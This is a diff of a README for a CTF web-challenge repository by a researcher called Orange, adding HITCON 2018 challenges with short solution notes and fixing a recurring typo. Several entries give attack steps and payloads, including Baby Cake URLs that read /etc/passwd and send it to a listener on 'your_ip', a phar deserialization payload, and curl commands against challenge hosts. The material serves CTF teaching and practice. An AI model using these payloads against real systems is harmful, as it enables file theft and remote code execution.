@@ -1,20 +1,11 @@
+
 # My CTF Web Challenges
 
-
-Hi, I am Orange. This is the repo of CTF challenges I made. It contains challenge's source code, writeup and some idea explanation.  
-
-
-I am a CTFer and Bug Bounty Hunter, loving web hacking and penetration testing. So you will see these challs are all about web. If you have any question about these challs, you can find me in following ways  
-
-* orange@chroot.org   
-* [blog.orange.tw](http://blog.orange.tw/)   
-
-
-<br>
+This is the repo of CTF challenges I made, including the source code, write-up and idea explanation!
 Hope you like it :)  
 
 
-**P.s.** BTW, the series of `Babyfirst` are my favorite in all of these challenges. There are open questions to all and there are lots of creative solutions. If you don't have time to see all, please look the them at least!
+**P.s.** BTW, `Babyfirst` series are my favorite in all challenges. If you don't have time to see all, please look the them at least!
 
 * [Babyfirst](#babyfirst)  
 * [Babyfirst Revenge](#babyfirst-revenge)  
@@ -22,9 +13,22 @@ Hope you like it :)
 
 <br>
 
+You can contact me via:  
+* orange@chroot.org   
+* [blog.orange.tw](http://blog.orange.tw/)   
+* [@orange_8361](https://twitter.com/orange_8361)  
+
+<br>
 
 
 ## **Table of Content**
+
+* [HITCON 2018](#one-line-php-challenge)
+    * [One Line PHP Challenge](#one-line-php-challenge)
+    * [Baby Cake](#baby-cake)
+    * [Oh My Raddit](#oh-my-raddit)
+    * [Oh My Raddit v2](#oh-my-raddit-v2)
+    * [Why so Serials?](#why-so-serials)  
 
 * [HITCON 2017 Quals](#babyfirst-revenge)
     * [BabyFirst Revenge](#babyfirst-revenge)
@@ -60,10 +64,132 @@ Hope you like it :)
     
 <br>
 
+## **One Line PHP Challenge**
+  
+Difficulty: **★★★★☆**  
+Solved: **2 / 1541**  
+Tag:   **PHP**
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2018/one-line-php-challenge/src/index.php)  
+
+#### Solution
+
+P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04
+
+1. Control partial session file content by `PHP_SESSION_UPLOAD_PROGRESS`
+2. Bypass `session.upload_progress.cleanup = On` by `race condition` or `slow query`
+3. Control the prefix to `@<?php` by chaining PHP wrappers
+
+* [exp_for_php.py](hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py)
+
+#### Write Ups
+
+* TBD
+
+
+## **Baby Cake**
+  
+Difficulty: **★★★**  
+Solved: **2 / 1541**  
+Tag:   **Code Review**, **PHP**, **De-serialization**
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2018/baby-cake-src/baby_cake.tgz)  
+
+#### Solution
+
+Due to the implement of **`CURLOPT_SAFE_UPLOAD`** in CakePHP `FormData.php`. We can read arbitrary files!
+
+```sh
+# arbitrary file read, listen port 12345 on your server
+http://13.230.134.135/
+?url=http://your_ip:12345/
+&data[x]=@/etc/passwd
+
+# arbitrary de-serialization the Monolog POP chain
+http://13.230.134.135/
+?url=http://your_ip:12345/
+&data[x]=@phar://../tmp/cache/mycache/[you_ip]/[md5_of_url]/body.cache
+```
+
+* [exploit.phar](hitcon-ctf-2018/one-line-php-challenge/exploit.phar)
+
+#### Write Ups
+
+* TBD
+
+## **Oh My Raddit**
+  
+Difficulty: **★★**  
+Solved: **2 / 1541**  
+Tag:   **Observation**, **DES checksum**, **Crypto**, **Web**
+
+#### Source Code
+
+* [app](hitcon-ctf-2018/oh-my-raddit/src/)  
+
+#### Solution
+
+1. Know `ECB` mode from block frequency analysis
+2. Know `block size = 8` from cipher length
+3. From the information above, it's reasonable to use `DES` in real world
+4. The most common block is `3ca92540eb2d0a42`(always in the cipher end). We can guess it's the padding `\x08\x08\x08\x08\x08\x08\x08\x08`
+5. Due to the checking parity in [DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard), we can reduce the keyspace from 26(`abcdefghijklmnopqrstuvwxyz`) to 14(`acegikmoqsuwyz`)
+    * Break in 1 second with `HashCat`
+    * Break in 10 minutes with single thread Python
+
+#### Write Ups
+
+* TBD
+
+## **Oh My Raddit v2**
+  
+Difficulty: **★★**  
+Solved: **2 / 1541**  
+Tag:   **Web.py**,  **SQL Injection to RCE**
+
+#### Source Code
+
+* [app](hitcon-ctf-2018/oh-my-raddit/src/)  
+
+#### Solution
+
+* Read the package version from `requirements.txt`
+* [Remote Code Execution in Web.py framework](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)
+
+* [exp.py](hitcon-ctf-2018/oh-my-raddit/exp.py)
+
+#### Write Ups
+
+* TBD
+
+## **Why so Serials?**
+  
+Difficulty: **★★★★**  
+Solved: **0 / 1541**  
+Tag:   **De-serialization**, **RCE**, **ASP.NET**, **View State**
+
+#### Source Code
+
+* [index.php](hitcon-ctf-2018/why-so-serials/src/Default.aspx)  
+
+#### Solution
+
+1. Get the `machineKey` in `web.config` by Server-Side-Includes(`.shtml` or `.stm`)
+2. Exploit `ASP.NET` `___VIEWSTATE` by [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+
+#### Write Ups
+
+* TBD
+
+
 ## **BabyFirst Revenge**
   
 Difficulty: **★☆**  
-Sovled: **95 / 1541**  
+Solved: **95 / 1541**  
 Tag:  **WhiteBox**, **PHP**, **Command Injection**  
 
 #### Idea
@@ -109,11 +235,11 @@ You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for
 
 #### Write Ups
 
-* [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)  
+* [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)  
 * [HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)](http://www.jianshu.com/p/82788b6949c7)  
 * [HITCON 2017 CTF BabyFirst Revenge](https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/)  
 * [HITCON CTF 2017 - BabyFirst Revenge (172 pts.)](https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/)  
-* [Hitcon CTF 2017 - Baby Revenge](https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/)  
+* [Hitcon CTF 2017 - Baby Revenge](https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/)  
 * [Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)](https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/)  
 * [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)  
 * [BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter](https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS)  
@@ -123,7 +249,7 @@ You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for
 ## **BabyFirst Revenge v2**
   
 Difficulty: **★★★★**  
-Sovled: **8 / 1541**  
+Solved: **8 / 1541**  
 Tag:  **WhiteBox**, **PHP**, **Command Injection**  
 
 #### Idea
@@ -157,7 +283,7 @@ You can check [exploit.py](hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) for 
 ## **SSRFme?**
   
 Difficulty: **★★☆**  
-Sovled: **20 / 1541**  
+Solved: **20 / 1541**  
 Tag:  **WhiteBox**, **Perl**, **PATH Pollution**  
 
 #### Idea
@@ -195,7 +321,7 @@ $ curl http://host/?filename=xxx&url=orange://orange.tw
 ## **SQL so Hard**
   
 Difficulty: **★★★**  
-Sovled: **10 / 1541**  
+Solved: **10 / 1541**  
 Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injection**  
 
 #### Idea
@@ -220,7 +346,7 @@ Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injecti
 ## **Baby^H Master PHP 2017**
   
 Difficulty: **★★★★☆**  
-Sovled: **0 / 1541**  
+Solved: **0 / 1541**  
 Tag:  **WhiteBox**, **PHP**, **Serialization**, **Apache Prefock**  
 
 #### Idea
@@ -261,7 +387,7 @@ $ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=
 ## **papapa**
   
 Difficulty: **★**  
-Sovled: **71 / 1024**  
+Solved: **71 / 1024**  
 Tag:  **BlackBox**, **SSL**, **Pentesting**  
 
 #### Idea
@@ -295,7 +421,7 @@ $ curl -k  -H "host: very-secret-area-for-ctf.orange.tw" https://1.2.3.4/
 ## **Leaking**
 
 Difficulty: **★★**  
-Sovled: **43 / 1024**  
+Solved: **43 / 1024**  
 Tag: **WhiteBox**, **JavaScript**, **NodeJS**  
 
 #### Idea
@@ -326,7 +452,7 @@ $ while true; do curl 'http://1.2.3.4/?data=Buffer(1e4)' | grep -a hitcon; done;
 ## **BabyTrick**
 
 Difficulty: **★★★**  
-Sovled: **24 / 1024**  
+Solved: **24 / 1024**  
 Tag: **WhiteBox**, **PHP**, **MySQL**, **SQL Injection**, **Unserialize**
 
 #### Idea
@@ -363,7 +489,7 @@ curl http://1.2.3.4/
 ## **Angry Boy**
 
 Difficulty: **★★☆**  
-Sovled: **43 / 1024**  
+Solved: **43 / 1024**  
 Tag: **GrayBox**, **Java**
 
 #### Idea
@@ -388,7 +514,7 @@ Tag: **GrayBox**, **Java**
 ## **Angry Seam**
 
 Difficulty: **★★★★**  
-Sovled: **4 / 1024**  
+Solved: **4 / 1024**  
 Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, **Java Deserialization**  
 
 #### Idea
@@ -463,7 +589,7 @@ ccc: ls -alh
 
 ## **Babyfirst**
 
-Sovled: **33 / 969**  
+Solved: **33 / 969**  
 Difficulty: **★★**  
 Tag: **WhiteBox**, **PHP**, **Command Injection**  
 
@@ -533,7 +659,7 @@ And there are also lots of creative solutions, you can check the write ups below
 ## **nanana**
 
 Difficulty: **★★★**  
-Sovled: **18 / 969**  
+Solved: **18 / 969**  
 Tag: **GrayBox**, **C**, **PWN**  
 
 #### Idea
@@ -559,7 +685,7 @@ Tag: **GrayBox**, **C**, **PWN**
 ## **Giraffe's Coffee**
 
 Difficulty: **★★★☆**  
-Sovled: **16 / 969**  
+Solved: **16 / 969**  
 Tag:  **WhiteBox**, **PHP**  
 
 #### Idea
@@ -584,7 +710,7 @@ Tag:  **WhiteBox**, **PHP**
 ## **lalala**
 
 Difficulty: **★★★☆**  
-Sovled: **2 / 969**  
+Solved: **2 / 969**  
 Tag: **BlackBox**, **PHP**, **SSRF**  
 
 #### Idea
